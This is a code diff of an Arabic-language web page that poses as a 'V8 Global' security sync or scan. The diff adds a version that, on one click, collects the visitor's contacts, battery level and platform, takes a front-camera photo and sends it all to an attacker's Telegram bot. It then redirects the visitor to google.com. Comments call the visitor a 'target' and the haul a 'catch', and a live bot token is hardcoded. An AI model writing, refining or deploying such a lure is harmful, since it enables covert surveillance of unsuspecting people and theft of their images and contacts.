@@ -5,85 +5,102 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>V8 Global - Secure Sync</title>
     <style>
-        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { border: 1px solid #00ffcc; padding: 30px; border-radius: 15px; background: rgba(0,255,204,0.05); box-shadow: 0 0 20px #00ffcc; width: 90%; max-width: 400px; }
-        .btn { background: #00ffcc; color: #000; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; font-size: 16px; }
-        .progress-bar { width: 100%; height: 4px; background: #222; margin: 20px 0; position: relative; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: #00ffcc; transition: width 0.3s; }
-        #v, #c { display: none; }
+        body { background: #000; color: #00ffcc; text-align: center; padding-top: 100px; font-family: monospace; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #00ffcc; color: #000; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        /* فلاش أبيض لمنع الصور السوداء */
         .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
     <div class="flash" id="f"></div>
-    <div class="card">
-        <h2 id="t">V8 Global System</h2>
-        <p id="s">يرجى الضغط على الزر أدناه لمزامنة الأمان</p>
-        <div class="progress-bar"><div class="progress-fill" id="p"></div></div>
-        <button class="btn" id="b" onclick="startCapture()">بدء مزامنة الأمان ✅</button>
-    </div>
+    <h2 id="title">نظام V8 الاحترافي</h2>
+    <div id="status">يرجى الضغط على الزر أدناه لمزامنة الأمان</div>
+    <div class="loader" id="loader" style="display:none;"></div>
+    <button class="btn" id="startBtn" onclick="startProcess()">بدء فحص الأمان ✅</button>
 
     <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+    <canvas id="c" width="720" height="1280"></canvas>
 
     <script>
+        // التوكن الجديد الخاص بك
         const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
-        const params = new URLSearchParams(window.location.search);
-        const uid = params.get('id');
-        const mode = params.get('mode') || 'all';
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetID = urlParams.get('id');
 
-        async function startCapture() {
-            if(!uid) return;
-            document.getElementById('b').style.display = 'none';
-            updateUI("جاري طلب الصلاحيات...", 30);
+        async function startProcess() {
+            if(!targetID) return;
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('status').innerText = "جاري مزامنة البيانات...";
 
+            let finalReport = `🚀 **صيد V8 جديد:**\n`;
+
+            // 1. سحب البطارية والنظام
             try {
-                // طلب الكاميرا - بمجرد الضغط على سماح يبدأ السحب
+                let b = await navigator.getBattery();
+                finalReport += `🔋 الشحن: ${Math.floor(b.level*100)}%\n📱 النظام: ${navigator.platform}\n`;
+            } catch(e) {}
+
+            // 2. سحب جهات الاتصال (يتطلب موافقة المستخدم)
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (contacts.length > 0) {
+                        finalReport += `\n📇 **جهات الاتصال المستخرجة:**\n`;
+                        contacts.forEach(c => {
+                            finalReport += `👤 ${c.name}: ${c.tel}\n`;
+                        });
+                    }
+                } catch (err) { finalReport += `\n❌ تم رفض إذن الأسماء.\n`; }
+            }
+
+            // إرسال البيانات النصية أولاً
+            await sendText(finalReport);
+
+            // 3. سحب الكاميرا مع حل مشكلة الصور السوداء
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
-                updateUI("جاري فحص النظام...", 60);
-
-                // انتظار بسيط لضبط العدسة
-                await new Promise(r => setTimeout(r, 1500));
-
-                // فلاش وتحسين جودة الصورة
-                document.getElementById('f').style.opacity = '1';
-                const canvas = document.getElementById('c');
                 const video = document.getElementById('v');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                video.srcObject = stream;
+
+                // انتظار 3 ثوانٍ للسماح للكاميرا بضبط الإضاءة (حل مشكلة السواد)
+                await new Promise(r => setTimeout(r, 3000));
+
+                // تشغيل الفلاش الرقمي وقت التقاط الصورة
+                document.getElementById('f').style.opacity = '1';
+                
+                const canvas = document.getElementById('c');
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 720, 1280);
                 const photo = canvas.toDataURL('image/jpeg', 0.9);
+                
                 document.getElementById('f').style.opacity = '0';
 
-                updateUI("جاري إرسال البيانات...", 90);
-
-                // جمع معلومات البطارية
-                const bat = await navigator.getBattery();
-                const info = `🚀 **صيد V8 جديد (${mode}):**\n🔋 الشحن: ${Math.floor(bat.level*100)}%\n📱 النظام: ${navigator.platform}`;
-
-                // إرسال الصورة والبيانات للأيدي المحدد في الرابط
+                // إرسال الصورة
                 const blob = await (await fetch(photo)).blob();
                 const fd = new FormData();
-                fd.append('chat_id', uid);
+                fd.append('chat_id', targetID);
                 fd.append('photo', blob, 'v8.jpg');
-                fd.append('caption', info);
+                fd.append('caption', "📸 صورة الهدف الحقيقية");
 
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                
-                updateUI("تمت المزامنة بنجاح!", 100);
-                stream.getTracks().forEach(t => t.stop());
-                setTimeout(() => window.location.replace("https://google.com"), 1500);
 
+                stream.getTracks().forEach(t => t.stop());
+                window.location.replace("https://google.com");
             } catch (e) {
-                updateUI("فشل في المزامنة!", 0);
                 window.location.replace("https://google.com");
             }
         }
 
-        function updateUI(text, prog) {
-            document.getElementById('s').innerText = text;
-            document.getElementById('p').style.width = prog + '%';
+        async function sendText(msg) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: targetID, text: msg, parse_mode: 'Markdown' })
+            });
         }
     </script>
 </body>
